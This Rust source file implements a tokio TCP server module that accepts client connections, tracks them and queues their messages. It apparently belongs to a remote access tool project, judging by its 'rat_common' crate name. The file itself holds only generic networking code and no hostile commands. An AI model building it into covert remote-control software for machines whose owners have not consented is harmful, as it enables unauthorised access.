use std::collections::HashMap;
use std::io;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::info;
use rat_common::messages::ClientMessage;
use rat_common::module::{Module, ModuleState};
use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
use tokio::sync::{Mutex, mpsc};
use tokio::task::JoinHandle;

use crate::modules::connection::connector::Connector;

const _MAX_QUEUED_MESSAGES: usize = 100;

pub struct Server {
    _listener: TcpListener,
    _sender: mpsc::Sender<(SocketAddr, ClientMessage)>,
    _receiver: Mutex<mpsc::Receiver<(SocketAddr, ClientMessage)>>,
    _clients: Mutex<HashMap<SocketAddr, (Arc<Connector>, JoinHandle<()>)>>,
    _state: Arc<ModuleState>,
}

impl Server {
    pub async fn bind<A: ToSocketAddrs>(addr: A) -> anyhow::Result<Arc<Self>> {
        let listener = TcpListener::bind(addr).await?;
        let (sender, receiver) = mpsc::channel(_MAX_QUEUED_MESSAGES);
        Ok(Arc::new(Self {
            _listener: listener,
            _sender: sender,
            _receiver: Mutex::new(receiver),
            _clients: Mutex::new(HashMap::new()),
            _state: Arc::new(ModuleState::new()),
        }))
    }
}

#[async_trait]
impl Module for Server {
    type EventType = io::Result<(TcpStream, SocketAddr)>;

    fn name(&self) -> &str {
        "Server"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        self._listener.accept().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let (stream, addr) = event?;
        info!("New connection from {addr}");

        let connector = Arc::new(Connector::new(stream, addr, self._sender.clone()));
        let connector_cloned = connector.clone();

        let self_cloned = self.clone();
        let handle = tokio::spawn(async move {
            let _ = connector_cloned.run().await;

            let mut clients = self_cloned._clients.lock().await;
            let _ = clients.remove(&addr);
            info!("{addr} disconnected");
        });

        let mut clients = self._clients.lock().await;
        clients.insert(addr, (connector, handle));

        Ok(())
    }

    async fn after_hook(self: Arc<Self>) -> anyhow::Result<()> {
        let mut handles = vec![];

        let mut clients = self._clients.lock().await;
        for (_, (connector, handle)) in clients.drain() {
            connector.stop();

            // Do not wait for handles here to avoid deadlocks
            handles.push(handle);
        }

        drop(clients);

        for handle in handles {
            let _ = handle.await;
        }

        Ok(())
    }
}
